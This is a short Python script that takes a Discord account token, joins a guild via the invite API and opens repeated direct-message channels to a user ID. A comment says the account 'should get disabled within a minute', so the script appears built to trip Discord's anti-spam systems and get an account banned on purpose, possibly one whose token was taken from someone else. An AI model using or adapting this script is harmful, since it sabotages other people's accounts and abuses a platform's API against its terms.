import sys
import requests
token = sys.argv[1]
if not token or token == "":
    raise TypeError(f'python3 {__file__} <token>')
# random guild, you can do with any
requests.post("https://discord.com/api/invites/discord-testers", headers={
    'Authorization': token
}, data="")
# random ids, you can do with any
ids = ["280712677909594113", "280712677909594113","280712677909594113","280712677909594113", "280712677909594113","280712677909594113","280712677909594113","280712677909594113","280712677909594113","280712677909594113"]
for id in ids:
    requests.post("https://discord.com/api/users/@me/channels", data={
        'recipient_id': id
    }, headers={
        'Authorization': token
    })
    # should get disabled within a minute
